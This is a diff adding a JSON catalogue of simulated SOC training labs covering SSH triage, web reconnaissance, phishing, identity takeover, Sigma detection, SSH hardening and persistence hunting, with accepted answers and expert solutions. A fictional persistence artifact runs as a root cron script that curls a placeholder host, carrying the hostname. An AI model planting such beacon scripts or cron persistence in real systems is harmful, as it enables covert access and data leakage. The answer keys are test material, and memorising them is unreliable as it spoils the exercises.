@@ -1,0 +1,379 @@
+{
+  "schemaVersion": 1,
+  "reviewState": "internally-checked-pending-external-review",
+  "labs": [
+    {
+      "id": "soc-lab-linux-auth-triage",
+      "version": "1.0.0",
+      "title": "Triage repeated SSH authentication failures",
+      "labType": "guided",
+      "category": "Linux and authentication",
+      "difficulty": "foundation",
+      "estimatedMinutes": 35,
+      "prerequisites": ["linux-navigation", "linux-logs"],
+      "linkedSkills": ["linux-navigation", "linux-logs", "authentication-events", "alert-triage"],
+      "objectives": [
+        { "id": "locate-log", "title": "Locate the authentication log", "required": true, "stage": 1 },
+        { "id": "identify-source", "title": "Identify the repeated source address", "required": true, "stage": 2 },
+        { "id": "bound-conclusion", "title": "State a bounded triage conclusion", "required": true, "stage": 3 },
+        { "id": "bonus-process-check", "title": "Check for a correlated process", "required": false, "bonus": true, "stage": 2 }
+      ],
+      "scenario": "A fictional Linux jump host generated an SSH alert. Determine what happened, preserve the relevant evidence, and recommend the next defensive action.",
+      "learnerInstructions": [
+        "Use only the simulated terminal and supplied files.",
+        "Begin by locating relevant logs; do not assume the alert proves compromise.",
+        "Submit the source address, conclusion, recommendation, and reflection."
+      ],
+      "availableTools": ["pwd", "ls", "cd", "cat", "grep", "find", "ps", "netstat", "ss", "journalctl", "tail", "head"],
+      "virtualEnvironment": {
+        "cwd": "/home/analyst",
+        "files": [
+          { "path": "/home/analyst/README.txt", "content": "Authorized synthetic investigation. Authentication records are under /var/log.", "mode": "0644", "owner": "analyst", "group": "soc" },
+          { "path": "/var/log/auth.log", "content": "Jul 30 09:14:01 jump01 sshd[2114]: Failed password for invalid user admin from 203.0.113.42 port 51120 ssh2\nJul 30 09:14:04 jump01 sshd[2118]: Failed password for invalid user admin from 203.0.113.42 port 51124 ssh2\nJul 30 09:14:09 jump01 sshd[2121]: Failed password for salma from 203.0.113.42 port 51131 ssh2\nJul 30 09:17:33 jump01 sshd[2160]: Accepted publickey for backup from 192.0.2.18 port 49221 ssh2", "mode": "0640", "owner": "root", "group": "adm" },
+          { "path": "/var/log/syslog", "content": "Jul 30 09:14:00 jump01 systemd[1]: Started Daily apt download activities.\nJul 30 09:16:00 jump01 cron[2140]: session opened for user root", "mode": "0640", "owner": "root", "group": "adm" }
+        ],
+        "processes": [
+          { "pid": 1, "user": "root", "command": "/sbin/init" },
+          { "pid": 820, "user": "root", "command": "/usr/sbin/sshd -D" },
+          { "pid": 2240, "user": "analyst", "command": "bash" }
+        ],
+        "connections": [
+          { "protocol": "tcp", "local": "0.0.0.0:22", "remote": "0.0.0.0:*", "state": "LISTEN", "process": "sshd" }
+        ]
+      },
+      "checkpoints": [
+        { "afterCommand": "pwd", "feedback": "You established the starting location before navigating." },
+        { "afterCommand": "grep", "feedback": "Filtering the authentication log reduces unrelated records." }
+      ],
+      "validation": {
+        "requiredCommands": ["pwd", "grep"],
+        "alternativeCommandPaths": [["cat"], ["tail"], ["journalctl"]],
+        "submissionFields": {
+          "indicator": { "accepted": ["203.0.113.42"] },
+          "classification": { "accepted": ["suspicious authentication", "ssh password spraying", "password spraying"] },
+          "recommendation": { "keywords": ["correlate", "identity", "block", "monitor"], "minimumMatches": 2 },
+          "report": { "keywords": ["203.0.113.42", "failed", "uncertainty", "next"], "minimumMatches": 3, "minimumLength": 120 }
+        }
+      },
+      "hints": [
+        { "level": 1, "kind": "orientation", "text": "Start by identifying your current directory and the available top-level evidence locations." },
+        { "level": 2, "kind": "conceptual", "text": "Authentication failures are commonly recorded in an authentication log or service journal." },
+        { "level": 3, "kind": "procedural", "text": "Use grep with a relevant term against a file under /var/log." },
+        { "level": 4, "kind": "worked-example", "text": "Example pattern: grep 'Failed password' /path/to/log. Adapt the path to this scenario." },
+        { "level": 5, "kind": "guided-mode", "text": "Run grep 'Failed password' /var/log/auth.log, count the repeated source, then state what the evidence does and does not prove." }
+      ],
+      "reflectionQuestions": ["What additional identity or firewall evidence would change your confidence?", "Why is a failed-login burst not proof of host compromise?"],
+      "completionCriteria": { "minimumRequiredObjectives": 3, "minimumOverallBand": "developing", "reportRequired": true },
+      "generatedEvidence": { "artifactType": "incident-report", "title": "SSH authentication triage report" },
+      "portfolioEligibility": true,
+      "expertSolution": ["Establish location and scope.", "Filter auth.log for failed SSH attempts.", "Identify 203.0.113.42 as the repeated source.", "Separate password-spraying evidence from compromise claims.", "Recommend identity/firewall correlation and monitored blocking."]
+    },
+    {
+      "id": "soc-lab-web-log-independent",
+      "version": "1.0.0",
+      "title": "Investigate anomalous web access independently",
+      "labType": "independent",
+      "category": "Web logs",
+      "difficulty": "intermediate",
+      "estimatedMinutes": 40,
+      "prerequisites": ["http", "linux-logs"],
+      "linkedSkills": ["http", "linux-logs", "ioc-analysis"],
+      "objectives": [
+        { "id": "find-anomaly", "title": "Identify the anomalous request pattern", "required": true, "stage": 1 },
+        { "id": "scope-source", "title": "Scope the source and responses", "required": true, "stage": 2 },
+        { "id": "document-web", "title": "Document a defensible finding", "required": true, "stage": 3 }
+      ],
+      "scenario": "An Nginx service produced an alert for unusual access. Decide how to investigate using only the synthetic records.",
+      "learnerInstructions": ["Investigate independently.", "No prescriptive command sequence is provided.", "Submit the strongest indicator and a reproducible report."],
+      "availableTools": ["pwd", "ls", "cd", "cat", "grep", "find", "tail", "head"],
+      "virtualEnvironment": {
+        "cwd": "/home/analyst",
+        "files": [
+          { "path": "/var/log/nginx/access.log", "content": "192.0.2.44 - - [30/Jul/2026:10:01:00 +0000] \"GET / HTTP/1.1\" 200 1042\n198.51.100.77 - - [30/Jul/2026:10:03:11 +0000] \"GET /.env HTTP/1.1\" 404 153\n198.51.100.77 - - [30/Jul/2026:10:03:13 +0000] \"GET /config.php.bak HTTP/1.1\" 404 153\n198.51.100.77 - - [30/Jul/2026:10:03:15 +0000] \"GET /admin HTTP/1.1\" 403 153", "mode": "0640", "owner": "www-data", "group": "adm" }
+        ],
+        "processes": [{ "pid": 910, "user": "www-data", "command": "nginx: worker process" }],
+        "connections": [{ "protocol": "tcp", "local": "0.0.0.0:443", "remote": "0.0.0.0:*", "state": "LISTEN", "process": "nginx" }]
+      },
+      "validation": {
+        "requiredCommands": ["grep"],
+        "alternativeCommandPaths": [["cat"], ["tail"]],
+        "submissionFields": {
+          "indicator": { "accepted": ["198.51.100.77"] },
+          "classification": { "accepted": ["web reconnaissance", "suspicious web reconnaissance"] },
+          "recommendation": { "keywords": ["review", "waf", "block", "monitor"], "minimumMatches": 2 },
+          "report": { "keywords": ["198.51.100.77", ".env", "404", "403"], "minimumMatches": 3, "minimumLength": 120 }
+        }
+      },
+      "hints": [
+        { "level": 1, "kind": "orientation", "text": "Identify which file records requests to the web service." },
+        { "level": 2, "kind": "conceptual", "text": "Look for one source requesting sensitive or backup paths." },
+        { "level": 3, "kind": "procedural", "text": "Filter the access log by a suspicious path or repeated address." },
+        { "level": 4, "kind": "worked-example", "text": "A request for /.env is a reconnaissance lead; correlate it with other paths and response codes." },
+        { "level": 5, "kind": "guided-mode", "text": "Read /var/log/nginx/access.log and report the source requesting /.env, a backup file, and /admin." }
+      ],
+      "reflectionQuestions": ["What do the response codes imply about exposure?", "What evidence would distinguish scanning from exploitation?"],
+      "completionCriteria": { "minimumRequiredObjectives": 3, "minimumOverallBand": "developing", "reportRequired": true },
+      "generatedEvidence": { "artifactType": "analysis-summary", "title": "Web reconnaissance analysis" },
+      "portfolioEligibility": true,
+      "expertSolution": ["Inspect the Nginx access log.", "Group suspicious paths by source.", "Report 198.51.100.77 and the response codes.", "Avoid claiming successful access.", "Recommend monitoring and WAF review."]
+    },
+    {
+      "id": "soc-lab-phishing-timeline",
+      "version": "1.0.0",
+      "title": "Build a phishing investigation timeline",
+      "labType": "investigation",
+      "category": "Email and endpoint",
+      "difficulty": "intermediate",
+      "estimatedMinutes": 45,
+      "prerequisites": ["email-analysis", "windows-events"],
+      "linkedSkills": ["email-analysis", "windows-processes", "authentication-events", "incident-reporting"],
+      "objectives": [
+        { "id": "correlate-message", "title": "Correlate message and endpoint evidence", "required": true, "stage": 1 },
+        { "id": "timeline", "title": "Build the event timeline", "required": true, "stage": 2 },
+        { "id": "uncertainty", "title": "Document remaining uncertainty", "required": true, "stage": 3 }
+      ],
+      "scenario": "A reported payroll message is followed by endpoint and authentication telemetry. Reconstruct the supported sequence.",
+      "learnerInstructions": ["Inspect the supplied message, endpoint, and identity files.", "Correlate timestamps and identifiers.", "Submit a timeline-oriented report."],
+      "availableTools": ["pwd", "ls", "cd", "cat", "grep", "find", "tail", "head"],
+      "virtualEnvironment": {
+        "cwd": "/evidence",
+        "files": [
+          { "path": "/evidence/email/header.txt", "content": "09:58:11Z From: Payroll <payroll@company.example>\nReply-To: cases@payr0ll.example\nAuthentication-Results: spf=fail\nLink: https://login-check.example/update", "mode": "0440", "owner": "analyst", "group": "soc" },
+          { "path": "/evidence/endpoint/events.log", "content": "10:03:04Z host=FIN-14 parent=OUTLOOK.EXE process=powershell.exe command=\"powershell -enc ...\"\n10:03:19Z host=FIN-14 dns=login-check.example answer=203.0.113.80", "mode": "0440", "owner": "analyst", "group": "soc" },
+          { "path": "/evidence/identity/signins.log", "content": "10:14:02Z user=salma result=success source=203.0.113.80 device=unmanaged", "mode": "0440", "owner": "analyst", "group": "soc" }
+        ],
+        "processes": [],
+        "connections": []
+      },
+      "validation": {
+        "requiredCommands": ["cat", "grep"],
+        "alternativeCommandPaths": [["find"], ["head"]],
+        "submissionFields": {
+          "indicator": { "accepted": ["login-check.example", "203.0.113.80"] },
+          "classification": { "accepted": ["suspected phishing compromise", "suspected account compromise"] },
+          "recommendation": { "keywords": ["isolate", "revoke", "preserve", "scope"], "minimumMatches": 2 },
+          "report": { "keywords": ["09:58", "10:03", "10:14", "uncertainty"], "minimumMatches": 3, "minimumLength": 160 }
+        }
+      },
+      "hints": [
+        { "level": 1, "kind": "orientation", "text": "Inventory the evidence directories before reading individual files." },
+        { "level": 2, "kind": "conceptual", "text": "Correlate message, process, DNS, and sign-in records by time and subject." },
+        { "level": 3, "kind": "procedural", "text": "Read all three evidence files and normalize their UTC timestamps." },
+        { "level": 4, "kind": "worked-example", "text": "A mail-client parent spawning encoded PowerShell supports suspicion but still needs correlation." },
+        { "level": 5, "kind": "guided-mode", "text": "Order 09:58 message, 10:03 process/DNS, and 10:14 sign-in; state that causation and broader scope remain uncertain." }
+      ],
+      "reflectionQuestions": ["Which event adds independent corroboration?", "Which missing telemetry most limits the conclusion?"],
+      "completionCriteria": { "minimumRequiredObjectives": 3, "minimumOverallBand": "developing", "reportRequired": true },
+      "generatedEvidence": { "artifactType": "timeline", "title": "Phishing investigation timeline" },
+      "portfolioEligibility": true,
+      "expertSolution": ["Inventory evidence.", "Read message, endpoint, and identity records.", "Normalize the timeline.", "Correlate FIN-14 and Salma.", "State suspected compromise with bounded scope."]
+    },
+    {
+      "id": "soc-lab-identity-incident-response",
+      "version": "1.0.0",
+      "title": "Respond to suspected identity takeover",
+      "labType": "incident-response",
+      "category": "Incident response",
+      "difficulty": "intermediate",
+      "estimatedMinutes": 50,
+      "prerequisites": ["authentication-events", "incident-severity"],
+      "linkedSkills": ["authentication-events", "incident-severity", "evidence-preservation", "escalation-writing"],
+      "objectives": [
+        { "id": "classify-incident", "title": "Classify the supported incident", "required": true, "stage": 1 },
+        { "id": "preserve-ir", "title": "Identify evidence to preserve", "required": true, "stage": 2 },
+        { "id": "contain-ir", "title": "Recommend proportionate containment", "required": true, "stage": 3 },
+        { "id": "escalate-ir", "title": "Write an escalation", "required": true, "stage": 4 }
+      ],
+      "scenario": "A finance user has a successful new-source sign-in followed by mailbox rule creation and MFA denials.",
+      "learnerInstructions": ["Inspect identity and audit records.", "Classify the incident and recommend authorized containment.", "Preserve uncertainty and requested approvals."],
+      "availableTools": ["pwd", "ls", "cd", "cat", "grep", "find", "tail", "head"],
+      "virtualEnvironment": {
+        "cwd": "/case",
+        "files": [
+          { "path": "/case/identity.log", "content": "11:22:02Z user=nadia action=signin result=success source=198.51.100.66 device=new\n11:24:31Z user=nadia action=create-mailbox-rule target=ArchiveInvoices\n11:26:10Z user=nadia action=mfa result=denied count=4", "mode": "0440", "owner": "analyst", "group": "soc" },
+          { "path": "/case/asset.txt", "content": "User Nadia works in Finance. No approved travel or new device is recorded.", "mode": "0440", "owner": "analyst", "group": "soc" }
+        ],
+        "processes": [],
+        "connections": []
+      },
+      "validation": {
+        "requiredCommands": ["cat"],
+        "alternativeCommandPaths": [["grep"], ["tail"]],
+        "submissionFields": {
+          "indicator": { "accepted": ["198.51.100.66"] },
+          "classification": { "accepted": ["suspected account takeover", "identity compromise"] },
+          "recommendation": { "keywords": ["revoke", "reset", "disable", "preserve"], "minimumMatches": 2 },
+          "report": { "keywords": ["nadia", "mailbox", "uncertainty", "approval"], "minimumMatches": 3, "minimumLength": 160 }
+        }
+      },
+      "hints": [
+        { "level": 1, "kind": "orientation", "text": "Review both the identity events and business context." },
+        { "level": 2, "kind": "conceptual", "text": "New-source success plus unauthorized mailbox change is stronger than either event alone." },
+        { "level": 3, "kind": "procedural", "text": "Build a short timeline and identify the containment decision requiring approval." },
+        { "level": 4, "kind": "worked-example", "text": "A bounded response may revoke active sessions while preserving identity audit records." },
+        { "level": 5, "kind": "guided-mode", "text": "Classify suspected takeover, preserve sign-in/mailbox/MFA events, request session revocation and credential reset, then scope other activity." }
+      ],
+      "reflectionQuestions": ["Which containment action is reversible?", "What business impact affects severity?"],
+      "completionCriteria": { "minimumRequiredObjectives": 4, "minimumOverallBand": "developing", "reportRequired": true },
+      "generatedEvidence": { "artifactType": "recommendation-report", "title": "Identity incident escalation" },
+      "portfolioEligibility": true,
+      "expertSolution": ["Correlate the sign-in, rule, and MFA sequence.", "Preserve identity audit evidence.", "Classify suspected takeover.", "Request session revocation and reset.", "Escalate supported scope and uncertainty."]
+    },
+    {
+      "id": "soc-lab-sigma-detection",
+      "version": "1.0.0",
+      "title": "Write detection logic for encoded PowerShell",
+      "labType": "detection",
+      "category": "Detection engineering",
+      "difficulty": "intermediate",
+      "estimatedMinutes": 45,
+      "prerequisites": ["windows-processes", "siem-query-reasoning"],
+      "linkedSkills": ["windows-processes", "siem-query-reasoning", "alert-triage"],
+      "objectives": [
+        { "id": "inspect-events", "title": "Inspect the process dataset", "required": true, "stage": 1 },
+        { "id": "write-rule", "title": "Write bounded detection logic", "required": true, "stage": 2 },
+        { "id": "test-rule", "title": "Explain expected matches and false positives", "required": true, "stage": 3 }
+      ],
+      "scenario": "Create a Sigma-style rule or SIEM query that detects encoded PowerShell spawned by a mail client in the supplied dataset.",
+      "learnerInstructions": ["Inspect the synthetic process events.", "Submit detection logic and a report explaining scope and expected false positives."],
+      "availableTools": ["pwd", "ls", "cd", "cat", "grep", "find", "head", "tail"],
+      "virtualEnvironment": {
+        "cwd": "/detections",
+        "files": [
+          { "path": "/detections/process-events.jsonl", "content": "{\"host\":\"FIN-14\",\"parent\":\"OUTLOOK.EXE\",\"process\":\"powershell.exe\",\"command\":\"powershell -enc SQBFAFgA\"}\n{\"host\":\"DEV-02\",\"parent\":\"explorer.exe\",\"process\":\"powershell.exe\",\"command\":\"powershell Get-Process\"}", "mode": "0440", "owner": "analyst", "group": "soc" }
+        ],
+        "processes": [],
+        "connections": []
+      },
+      "validation": {
+        "requiredCommands": ["cat"],
+        "alternativeCommandPaths": [["grep"]],
+        "submissionFields": {
+          "indicator": { "accepted": ["-enc", "encodedcommand"] },
+          "classification": { "accepted": ["suspicious process creation", "encoded powershell"] },
+          "recommendation": { "keywords": ["parent", "outlook", "command", "powershell"], "minimumMatches": 3 },
+          "report": { "keywords": ["selection", "condition", "false positive", "outlook"], "minimumMatches": 3, "minimumLength": 160 }
+        }
+      },
+      "hints": [
+        { "level": 1, "kind": "orientation", "text": "Inspect the available process-event dataset." },
+        { "level": 2, "kind": "conceptual", "text": "Combine process, command-line, and parent context to reduce noise." },
+        { "level": 3, "kind": "procedural", "text": "Your logic should require PowerShell, an encoded flag, and a mail-client parent." },
+        { "level": 4, "kind": "worked-example", "text": "Sigma selections can combine Image endswith powershell.exe, CommandLine contains -enc, and ParentImage endswith OUTLOOK.EXE." },
+        { "level": 5, "kind": "guided-mode", "text": "Write a selection containing powershell.exe, -enc, and OUTLOOK.EXE; use condition: selection and document legitimate automation as a possible false positive." }
+      ],
+      "reflectionQuestions": ["What benign workflow could match?", "Which field most improves precision?"],
+      "completionCriteria": { "minimumRequiredObjectives": 3, "minimumOverallBand": "developing", "reportRequired": true },
+      "generatedEvidence": { "artifactType": "sigma-rule", "title": "Encoded PowerShell detection rule" },
+      "portfolioEligibility": true,
+      "expertSolution": ["Inspect process records.", "Select PowerShell plus encoded command plus Outlook parent.", "Use an explicit condition.", "Test against both supplied rows.", "Document expected false positives."]
+    },
+    {
+      "id": "soc-lab-sshd-hardening",
+      "version": "1.0.0",
+      "title": "Harden a simulated SSH service",
+      "labType": "secure-configuration",
+      "category": "Linux hardening",
+      "difficulty": "foundation",
+      "estimatedMinutes": 35,
+      "prerequisites": ["linux-permissions", "linux-navigation"],
+      "linkedSkills": ["linux-permissions", "linux-navigation", "evidence-preservation"],
+      "objectives": [
+        { "id": "inspect-config", "title": "Inspect SSH configuration and permissions", "required": true, "stage": 1 },
+        { "id": "harden-config", "title": "Apply simulated hardening", "required": true, "stage": 2 },
+        { "id": "verify-config", "title": "Verify the simulated result", "required": true, "stage": 3 }
+      ],
+      "scenario": "A simulated SSH service allows root password login and its configuration is world writable. Harden the virtual configuration without touching the host.",
+      "learnerInstructions": ["Inspect the file and metadata.", "Use the simulated chmod/chown commands.", "Submit the target settings and verification report."],
+      "availableTools": ["pwd", "ls", "cd", "cat", "grep", "find", "head", "tail", "chmod", "chown"],
+      "virtualEnvironment": {
+        "cwd": "/etc/ssh",
+        "files": [
+          { "path": "/etc/ssh/sshd_config", "content": "PermitRootLogin yes\nPasswordAuthentication yes\nPubkeyAuthentication yes", "mode": "0666", "owner": "analyst", "group": "users" }
+        ],
+        "processes": [{ "pid": 820, "user": "root", "command": "/usr/sbin/sshd -D" }],
+        "connections": [{ "protocol": "tcp", "local": "0.0.0.0:22", "remote": "0.0.0.0:*", "state": "LISTEN", "process": "sshd" }]
+      },
+      "validation": {
+        "requiredCommands": ["cat", "chmod", "chown"],
+        "alternativeCommandPaths": [["ls"]],
+        "requiredFilesystem": [{ "path": "/etc/ssh/sshd_config", "mode": "0644", "owner": "root", "group": "root" }],
+        "submissionFields": {
+          "indicator": { "accepted": ["permitrootlogin no", "passwordauthentication no"] },
+          "classification": { "accepted": ["insecure ssh configuration", "ssh misconfiguration"] },
+          "recommendation": { "keywords": ["root", "password", "0644", "test"], "minimumMatches": 3 },
+          "report": { "keywords": ["sshd_config", "0644", "root", "verification"], "minimumMatches": 3, "minimumLength": 140 }
+        }
+      },
+      "hints": [
+        { "level": 1, "kind": "orientation", "text": "Inspect both file content and metadata." },
+        { "level": 2, "kind": "conceptual", "text": "Service configuration should not be world writable and should be owned by the privileged service owner." },
+        { "level": 3, "kind": "procedural", "text": "Use chmod and chown only inside this virtual environment." },
+        { "level": 4, "kind": "worked-example", "text": "A typical protected readable configuration uses mode 0644 and owner/group root." },
+        { "level": 5, "kind": "guided-mode", "text": "Run chmod 0644 /etc/ssh/sshd_config and chown root:root /etc/ssh/sshd_config, then document PermitRootLogin no and PasswordAuthentication no as required content changes." }
+      ],
+      "reflectionQuestions": ["Why verify before restarting a real service?", "Which access remains necessary for authorized administrators?"],
+      "completionCriteria": { "minimumRequiredObjectives": 3, "minimumOverallBand": "developing", "reportRequired": true },
+      "generatedEvidence": { "artifactType": "secure-configuration-report", "title": "SSH hardening verification" },
+      "portfolioEligibility": true,
+      "expertSolution": ["Read the configuration.", "Identify root/password login risk.", "Set simulated metadata to root:root 0644.", "Document required content changes.", "Plan syntax testing before a real restart."]
+    },
+    {
+      "id": "soc-lab-linux-persistence-hunt",
+      "version": "1.0.0",
+      "title": "Hunt for Linux persistence",
+      "labType": "threat-hunting",
+      "category": "Threat hunting",
+      "difficulty": "advanced",
+      "estimatedMinutes": 55,
+      "prerequisites": ["linux-processes", "linux-logs", "ioc-analysis"],
+      "linkedSkills": ["linux-processes", "linux-logs", "ioc-analysis", "siem-query-reasoning"],
+      "objectives": [
+        { "id": "form-hypothesis", "title": "Form a persistence hypothesis", "required": true, "stage": 1 },
+        { "id": "hunt-artifacts", "title": "Search persistence artifacts", "required": true, "stage": 2 },
+        { "id": "correlate-hunt", "title": "Correlate process and network evidence", "required": true, "stage": 3 },
+        { "id": "report-hunt", "title": "Report supported findings", "required": true, "stage": 4 }
+      ],
+      "scenario": "An analyst suspects a fictional Linux host has persistence. Hunt cron, service, process, and connection evidence without a provided step sequence.",
+      "learnerInstructions": ["State a hypothesis.", "Search the virtual filesystem and runtime datasets.", "Submit an IOC and a report with alternatives."],
+      "availableTools": ["pwd", "ls", "cd", "cat", "grep", "find", "ps", "netstat", "ss", "journalctl", "tail", "head"],
+      "virtualEnvironment": {
+        "cwd": "/home/analyst",
+        "files": [
+          { "path": "/etc/cron.d/system-update", "content": "*/5 * * * * root /usr/local/bin/system-update", "mode": "0644", "owner": "root", "group": "root" },
+          { "path": "/usr/local/bin/system-update", "content": "#!/bin/sh\ncurl -s https://updates.example.invalid/ping?id=$(hostname)", "mode": "0755", "owner": "root", "group": "root" },
+          { "path": "/var/log/syslog", "content": "Jul 30 12:00:01 hunt01 CRON[3100]: (root) CMD (/usr/local/bin/system-update)\nJul 30 12:00:02 hunt01 system-update[3101]: contacted 203.0.113.99:443", "mode": "0640", "owner": "root", "group": "adm" }
+        ],
+        "processes": [
+          { "pid": 3101, "user": "root", "command": "/bin/sh /usr/local/bin/system-update" },
+          { "pid": 3102, "user": "root", "command": "curl -s https://updates.example.invalid/ping?id=hunt01" }
+        ],
+        "connections": [
+          { "protocol": "tcp", "local": "10.0.0.14:49222", "remote": "203.0.113.99:443", "state": "ESTABLISHED", "process": "curl" }
+        ]
+      },
+      "validation": {
+        "requiredCommands": ["find", "ps", "ss"],
+        "alternativeCommandPaths": [["cat", "grep"], ["netstat"]],
+        "submissionFields": {
+          "indicator": { "accepted": ["/usr/local/bin/system-update", "203.0.113.99"] },
+          "classification": { "accepted": ["suspected cron persistence", "linux persistence"] },
+          "recommendation": { "keywords": ["preserve", "isolate", "disable", "scope"], "minimumMatches": 2 },
+          "report": { "keywords": ["cron", "system-update", "203.0.113.99", "alternative"], "minimumMatches": 3, "minimumLength": 180 }
+        }
+      },
+      "hints": [
+        { "level": 1, "kind": "orientation", "text": "Persistence often connects an auto-start mechanism to an executable." },
+        { "level": 2, "kind": "conceptual", "text": "Search scheduled tasks, then correlate their target with processes and connections." },
+        { "level": 3, "kind": "procedural", "text": "Use find under /etc, inspect processes, and list simulated sockets." },
+        { "level": 4, "kind": "worked-example", "text": "A cron entry launching an unusual script every five minutes is a lead; the process and remote connection add corroboration." },
+        { "level": 5, "kind": "guided-mode", "text": "Find files under /etc/cron.d, read system-update, run ps, then ss; report the cron-to-script-to-203.0.113.99 chain and preserve alternative explanations." }
+      ],
+      "reflectionQuestions": ["What authorized software could create a similar pattern?", "Which artifact should be preserved before disabling the job?"],
+      "completionCriteria": { "minimumRequiredObjectives": 4, "minimumOverallBand": "developing", "reportRequired": true },
+      "generatedEvidence": { "artifactType": "ioc-list", "title": "Linux persistence hunt findings" },
+      "portfolioEligibility": true,
+      "expertSolution": ["Form a cron-persistence hypothesis.", "Find /etc/cron.d/system-update.", "Trace its script.", "Correlate process and remote connection.", "Report IOC, uncertainty, preservation, and containment."]
+    }
+  ]
+}
